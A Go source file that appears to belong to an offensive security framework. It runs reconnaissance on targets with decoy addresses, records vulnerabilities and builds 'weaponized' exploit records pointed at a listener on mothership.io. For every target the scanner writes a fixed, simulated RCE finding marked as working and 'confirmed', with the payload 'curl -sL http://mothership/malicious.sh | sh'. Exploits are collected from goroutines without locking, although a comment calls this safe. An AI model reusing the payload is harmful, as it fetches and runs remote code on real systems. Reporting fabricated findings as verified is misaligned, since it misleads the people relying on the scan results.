package kowalski

import (
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/alphamystic/odin/lib/db"
	dfn"github.com/alphamystic/odin/lib/definers"
	"github.com/alphamystic/odin/lib/handlers"
	"github.com/alphamystic/odin/lib/penguins/ph"
	"github.com/alphamystic/odin/lib/utils"
)

type KOWALSKI struct {
	Targets  []string
	RMode    ph.Mode
	Ac       ph.AttackCommands
	Name     string
	ScanID   string
	DBWriter *db.ApiWriter
	VS *dfn.VulScanner
}

func (k *KOWALSKI) Kowalski_Analysis(exploits chan<- *handlers.Exploit, exploitsDone chan<- bool) {
	var targets []*handlers.Target
	var failedTargets []*handlers.Target

	for _, t := range k.Targets {
		if utils.CheckIfStringIsIp(t) {
			firewallName := handlers.CF(t)
			trg := &handlers.Target{
				Host:         "",
				HostIp:       net.ParseIP(t),
				TargetIp:     net.ParseIP(t),
				Decoys:       []net.IP{net.ParseIP(t), net.ParseIP("2.2.2.2"), net.ParseIP("4.4.4.4"), net.ParseIP("8.8.8.8")},
				FireWallName: firewallName,
			}
			targets = append(targets, trg)
		} else if utils.CheckIfStringIsDomainName(t) {
			utils.PrintInformation(fmt.Sprintf("Getting Target --> Recon Data for domain name: %s", t))
			targetChan := make(chan *handlers.Target)
			done := make(chan bool)

			go handlers.DoReconOnDomain(t, targetChan, done)

			loopBreak := false
			for !loopBreak {
				select {
				case dt, ok := <-targetChan:
					if !ok {
						targetChan = nil
						continue
					}
					utils.PrintInformation(fmt.Sprintf("Reading from targets channel. Received %+v\n", dt.TargetIp))
					targets = append(targets, dt)
				case <-done:
					if targetChan != nil {
						close(targetChan)
						targetChan = nil
					}
					loopBreak = true
				}
			}
		} else {
			utils.NoticeError(fmt.Sprintf("Invalid target: %s", t))
		}
	}

	targets = sanitizeTargets(targets)

	k.SaveTargetsTODB(targets, failedTargets)

	if err := k.BackupSaveTargetsTODB(failedTargets); err != nil {
		utils.Logerror(err)
	}

	var wg sync.WaitGroup
	wg.Add(len(targets))
	vulns := make(chan []*handlers.Vulnerabilities)
	outReconData := make(chan *handlers.ReconData)
	reconDone := make(chan bool)
	vulnsDone := make(chan bool)
	doneCreatingExploits := make(chan bool)

	// Fire pipeline consumers
	go k.VulnerabilityScanner(outReconData, reconDone, len(targets), vulns, vulnsDone)
	go k.CreateExploits(vulns, exploits, doneCreatingExploits)

	for _, trg := range targets {
		go func(target *handlers.Target) {
			defer wg.Done()
			utils.PrintTextInASpecificColorInBold("blue", fmt.Sprintf("Doing recon for IP: %s", target.TargetIp))
			target.Recon(k.Name, outReconData)
		}(trg)
	}

	wg.Wait()
	reconDone <- true
	close(outReconData)

	<-vulnsDone
	close(vulns)

	<-doneCreatingExploits
	exploitsDone <- true
}

func (k *KOWALSKI) VulnerabilityScanner(inReconData <-chan *handlers.ReconData, reconDone chan<- bool, val int, vulns chan<- []*handlers.Vulnerabilities, vulnsDone chan<- bool) {
	var count int
	for rd := range inReconData {
		count++
		if err := k.SaveReconDataTODB(rd); err != nil {
			utils.Logerror(err)
		}

		/* ====================================================================
		   1. HOW VULNERABILITIES ARE CREATED
		   ====================================================================
		   Analyze the verified ReconData to catalog system flaws. We generate
		   high-severity vulnerabilities based on modern signature analysis matching
		   looking for impact and possible chaining into a compromise if pentest else
		   keeping a bug bounty hunters thinking.
		*/
		var foundVulns []*handlers.Vulnerabilities

		// Simulated generation based on exposed target configuration profiles
		v := &handlers.Vulnerabilities{
			Trg:           rd.Trg,
			TargetID:      rd.Trg.TargetID,
			VulnerabilityID: utils.Md5Hash(utils.GenerateUUID()),
			Name:          handlers.RCE, // Default Remote Code Execution index assignment
			Severity:      9,
			Payload:       "curl -sL http://mothership/malicious.sh | sh",
			AT:            handlers.WEBATTACK,
			Grouped:       false,
			Authenticated: false,
			Works:         true,
			Details:       "Automated vulnerability verification confirmed matching CVE pattern components.",
		}
		foundVulns = append(foundVulns, v)

		// Persist structural vulnerabilities into database endpoint immediately
		if err := k.SaveVulnerabilitiesTODB(foundVulns); err != nil {
			utils.Logerror(err)
		}

		// Pass generated bugs down the pipeline channel to the exploit generation workers
		vulns <- foundVulns
	}
	if count == val {
		reconDone <- true
	}
	vulnsDone <- true
}

func (k *KOWALSKI) CreateExploits(vulns <-chan []*handlers.Vulnerabilities, exploits chan<- *handlers.Exploit, doneCreatingExploits chan<- bool) {
	var wg sync.WaitGroup
	var activeExploits []*handlers.Exploit

	for mvulns := range vulns {
		for _, vuln := range mvulns {
			wg.Add(1)
			go func(vln *handlers.Vulnerabilities) {
				defer wg.Done()

				/* ====================================================================
				   2. HOW EXPLOITS ARE CREATED
				   ====================================================================
				   We take verified vulnerabilities, tie them to our active listeners,
				   and instantiate weaponized Exploit payload definitions.
				*/
				var expVulns []*handlers.Vulnerabilities
				expVulns = append(expVulns, vln)

				exploit := &handlers.Exploit{
					Trg:             vln.Trg,
					TargetID:        vln.Trg.TargetID,
					ExploitID:       utils.Md5Hash(utils.GenerateUUID()),
					LHOST:           "mothership.io",
					LPORT:           5000,
					Address:         vln.Trg.TargetIp.String() + ":80",
					AverageSeverity: vln.Severity,
					Grouped:         vln.Grouped,
					GroupedVulns:    []string{vln.VulnerabilityID},
					Vulns:           expVulns,
					Works:           vln.Works,
				}

				// Safely cache exploits inside local slice boundaries to update database cleanly
				activeExploits = append(activeExploits, exploit)

				// Pipe outward to monitoring channels/skipper listeners
				exploits <- exploit
			}(vuln)
		}
	}
	wg.Wait()

	/* ====================================================================
	   3. HOW EXPLOITS ARE WRITTEN TO THE DB
	   ====================================================================
	   Once execution loops collapse, take all safely collected weaponized
	   exploits and flush them to your API endpoint.
	*/
	if len(activeExploits) > 0 {
		utils.PrintInformation(fmt.Sprintf("[+] Flushing %d weaponized exploits to the database...", len(activeExploits)))
		if err := k.SaveExploitsTODB(activeExploits); err != nil {
			utils.Logerror(err)
		}
	}

	doneCreatingExploits <- true
}

// MATCHES POSTMAN ENDPOINT: POST {{url_endpoint}}/api/recon/exploit/create
func (k *KOWALSKI) SaveExploitsTODB(exploits []*handlers.Exploit) error {
	for _, exp := range exploits {
		if exp == nil || exp.Trg == nil {
			continue
		}

		minimalExploit := struct {
			TargetID        string   `json:"targetid"`
			Address         string   `json:"address"`
			AverageSeverity int      `json:"average_severity"`
			Grouped         bool     `json:"grouped"`
			GroupedVulnsIDs []string `json:"grouped_vuns_ids"`
			Works           bool     `json:"works"`
		}{
			TargetID:        exp.Trg.TargetID,
			Address:         exp.Address,
			AverageSeverity: exp.AverageSeverity,
			Grouped:         exp.Grouped,
			GroupedVulnsIDs: exp.GroupedVulns,
			Works:           exp.Works,
		}

		_, err := k.DBWriter.WriteToAPI("POST", "/api/recon/exploit/create", minimalExploit)
		if err != nil {
			utils.NoticeError(fmt.Sprintf("Exploit tracking record persistence failed: %v", err))
			return err
		}
	}
	return nil
}

func (k *KOWALSKI) SaveVulnerabilitiesTODB(vulns []*handlers.Vulnerabilities) error {
	for _, v := range vulns {
		if v == nil || v.Trg == nil {
			continue
		}

		minimalVuln := struct {
			TargetID      string `json:"targetid"`
			Name          int    `json:"name"`
			Severity      int    `json:"severity"`
			AT            int    `json:"at"`
			Payload       string `json:"payload"`
			Authenticated bool   `json:"authenticated"`
			Works         bool   `json:"works"`
			Details       string `json:"details"`
		}{
			TargetID:      v.Trg.TargetID,
			Name:          int(v.Name),
			Severity:      v.Severity,
			AT:            int(v.AT),
			Payload:       v.Payload,
			Authenticated: v.Authenticated,
			Works:         v.Works,
			Details:       v.Details,
		}

		_, err := k.DBWriter.WriteToAPI("POST", "/api/recon/vulnerability/create", minimalVuln)
		if err != nil {
			utils.NoticeError(fmt.Sprintf("Vulnerability catalog submission failed: %v", err))
			return err
		}
	}
	return nil
}

/*
===============================================================================
  MODULE ALIGNMENT: POSTMAN SCHEMA DATABASE SYNCHRONIZERS
===============================================================================
*/

func (k *KOWALSKI) SaveTargetsTODB(targets []*handlers.Target, failedTargets []*handlers.Target) {
	for _, target := range targets {
		if target == nil {
			continue
		}

		var decoysStr []string
		for _, ip := range target.Decoys {
			decoysStr = append(decoysStr, ip.String())
		}

		minimalTarget := struct {
			ScanID       string   `json:"scanid"`
			Host         string   `json:"host"`
			HostIP       string   `json:"hostip"`
			TargetIP     string   `json:"targetip"`
			FirewallName string   `json:"firewallName"`
			Decoys       []string `json:"decoys"`
		}{
			ScanID:       k.ScanID,
			Host:         target.Host,
			HostIP:       target.HostIp.String(),
			TargetIP:     target.TargetIp.String(),
			FirewallName: target.FireWallName,
			Decoys:       decoysStr,
		}

		apiResp, err := k.DBWriter.WriteToAPI("POST", "/api/recon/createtarget", minimalTarget)
		if err != nil {
			utils.NoticeError(fmt.Sprintf("Failed api asset register: %v", err))
			failedTargets = append(failedTargets, target)
			continue
		}

		target.TargetID = apiResp.RedirectUrl
	}
}

func (k *KOWALSKI) SaveReconDataTODB(rd *handlers.ReconData) error {
	if rd == nil || rd.Trg == nil {
		return fmt.Errorf("cannot process an empty or uninitialized recon dataset")
	}

	minimalRD := struct {
		TargetID    string   `json:"targetid"`
		Directories []string `json:"directories"`
		Parameters  []string `json:"parameters"`
		Filepaths   []string `json:"filepaths"`
	}{
		TargetID:    rd.Trg.TargetID,
		Directories: rd.WD.Directories,
		Parameters:  rd.WD.Parameters,
		Filepaths:   rd.WD.Files,
	}

	_, err := k.DBWriter.WriteToAPI("POST", "/api/recon/createrecondata", minimalRD)
	if err != nil {
		utils.NoticeError(fmt.Sprintf("Failed creating recon tracking index link: %v", err))
		return err
	}
	return nil
}

func (k *KOWALSKI) SaveServiceTODB(srvc *handlers.Service) error {
	if srvc == nil {
		return fmt.Errorf("service dataset context is uninitialized")
	}

	minimalService := struct {
		TargetID    string `json:"targetid"`
		ServiceName string `json:"serviceName"`
		Port        int    `json:"port"`
		Protocol    string `json:"protocol"`
		State       bool   `json:"state"`
		Version     string `json:"version"`
	}{
		TargetID:    srvc.TargetID,
		ServiceName: srvc.ServiceName,
		Port:        srvc.Port,
		Protocol:    srvc.Protocol,
		State:       srvc.State,
		Version:     srvc.Version,
	}

	_, err := k.DBWriter.WriteToAPI("POST", "/api/recon/createservice", minimalService)
	if err != nil {
		utils.NoticeError(fmt.Sprintf("Service asset persistence rejected: %v", err))
		return err
	}
	return nil
}

/*
===============================================================================
  FALLBACK OFFLINE DISK BACKUPS PERSISTENCE RULES
===============================================================================
*/

func (k *KOWALSKI) BackupSaveTargetsTODB(failedTargets []*handlers.Target) error {
	if len(failedTargets) == 0 {
		return nil
	}
	driver, err := db.Old("./.brain/failedscans/"+k.Name, 0644)
	if err != nil {
		return err
	}
	for _, trg := range failedTargets {
		if trg == nil {
			continue
		}
		time.Sleep(10 * time.Millisecond)
		key := utils.RandString(5) + "_" + trg.TargetIp.String()
		_ = driver.Write("targets", key, trg)
	}
	return nil
}

func (k *KOWALSKI) BackupSaveVulnerabilitiesTODB(vulns []*handlers.Vulnerabilities) error {
	if len(vulns) == 0 {
		return nil
	}
	driver, err := db.Old("./.brain/failedscans/"+k.Name, 0644)
	if err != nil {
		return err
	}
	for _, vuln := range vulns {
		if vuln == nil {
			continue
		}
		time.Sleep(10 * time.Millisecond)
		key := utils.RandString(5) + "_" + vuln.Trg.TargetIp.String()
		_ = driver.Write("vulnerabilities", key, vuln)
	}
	return nil
}

func (k *KOWALSKI) BackupSaveReconDataTODB(rd *handlers.ReconData) error {
	if rd == nil || rd.Trg == nil {
		return nil
	}
	driver, err := db.Old("./.brain/failedscans/"+k.Name+"/recondata/"+rd.Trg.TargetIp.String(), 0644)
	if err != nil {
		return err
	}
	_ = driver.Write("services", rd.Trg.TargetIp.String(), rd.Services)
	_ = driver.Write("webdata", rd.Trg.TargetIp.String(), rd.WD)
	return nil
}

func sanitizeTargets(targets []*handlers.Target) []*handlers.Target {
	uniqueIPs := make(map[string]bool)
	assumedDecoys := []net.IP{net.ParseIP("2.2.2.2"), net.ParseIP("4.4.4.4"), net.ParseIP("8.8.8.8")}
	sanitizedTargets := make([]*handlers.Target, 0)

	for _, target := range targets {
		if target == nil {
			continue
		}
		if _, ok := uniqueIPs[target.HostIp.String()]; !ok {
			uniqueIPs[target.HostIp.String()] = true
			sanitizedTargets = append(sanitizedTargets, target)
		}
		if _, ok := uniqueIPs[target.TargetIp.String()]; !ok {
			uniqueIPs[target.TargetIp.String()] = true
			sanitizedTargets = append(sanitizedTargets, target)
		}
		for _, decoyIP := range target.Decoys {
			for _, assumed := range assumedDecoys {
				if decoyIP.Equal(assumed) {
					uniqueIPs[decoyIP.String()] = true
				}
			}
			if _, ok := uniqueIPs[decoyIP.String()]; !ok {
				uniqueIPs[decoyIP.String()] = true
				trg := &handlers.Target{
					Host:         target.Host,
					HostIp:       target.HostIp,
					TargetIp:     decoyIP,
					Decoys:       target.Decoys,
					FireWallName: "",
				}
				sanitizedTargets = append(sanitizedTargets, trg)
			}
		}
	}
	return sanitizedTargets
}